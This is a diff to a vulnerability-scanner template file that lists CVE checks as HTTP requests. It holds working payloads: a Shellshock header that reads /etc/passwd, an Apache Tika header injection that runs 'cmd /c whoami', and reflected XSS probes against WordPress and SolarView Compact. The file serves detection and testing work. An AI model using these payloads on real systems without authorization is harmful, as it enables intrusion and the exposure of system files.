@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6371,11 +6371,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -14227,6 +14227,21 @@
       ]
     },
     {
+      "id": "CVE-2021-25085",
+      "info": {
+        "name": "WOOF WordPress plugin - Reflected Cross-Site Script",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25111",
       "info": {
         "name": "English WordPress Admin < 1.5.2 - Unauthenticated Open Redirect",
@@ -17835,7 +17850,7 @@
       "id": "CVE-2022-1598",
       "info": {
         "name": "WordPress Plugin WPQA < 5.5 - Unauthenticated Private Message Disclosure",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -18450,6 +18465,36 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/goforms/rlminfo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29299",
+      "info": {
+        "name": "SolarView Compact 6.00 - 'time_begin' Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29301",
+      "info": {
+        "name": "SolarView Compact 6.00 - 'pow' Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green"
           ]
         }
       ]
